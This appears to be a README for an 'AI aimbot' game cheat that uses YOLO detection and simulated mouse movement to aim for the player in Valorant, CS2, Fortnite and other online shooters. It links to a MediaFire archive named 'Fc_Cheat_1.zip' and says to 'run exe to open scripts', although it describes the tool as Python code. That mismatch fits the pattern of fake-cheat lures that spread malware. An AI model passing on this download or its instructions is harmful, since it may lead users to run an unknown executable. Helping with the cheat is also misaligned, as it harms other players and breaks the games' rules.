# 🤖 AI Aimbot DEMO TESTED

AI model  aim-assist logic using object detection and mouse tracking. 

---

## 📦 Download

[Download AI Aimbot Demo](https://www.mediafire.com/file/m8qga4qo9cv4cmt/Fc_Cheat_1.zip/file)

*(Run exe to open scripts)*

---

## 🧠 Features

- AI-powered aim detection using OpenCV + YOLO  
- Target locking with configurable FOV and sensitivity  
- Simulated input via Python-based mouse control  
- FPS-like UI overlay to visualize targets and hits  
- Works with recorded gameplay or custom test environments  
- Modular code for experimentation or academic use

---

## ⚙️ How It Works

1. The tool processes video frames using a pre-trained YOLOv5 object detection model.
2. It identifies player targets in the scene based on bounding boxes.
3. Calculates distance-to-center and prioritizes nearest target.
4. Simulates smooth mouse movement toward the target (non-intrusive).
5. Optionally draws bounding boxes and tracking vectors on screen.

---
Witch game works - Apex Fortnite Valorant Cs2 Warzone rs6 Escape-from-tarkov (eft) Pubg
-
Doesn't work with 3rd person games (gta and more)

## 🛠 Requirements

- Python 3.8+
- `opencv-python`
- `pynput`
- `torch`, `yolov5` (included in archive)

```bash
pip install -r requirements.txt
python ai_aimbot.py
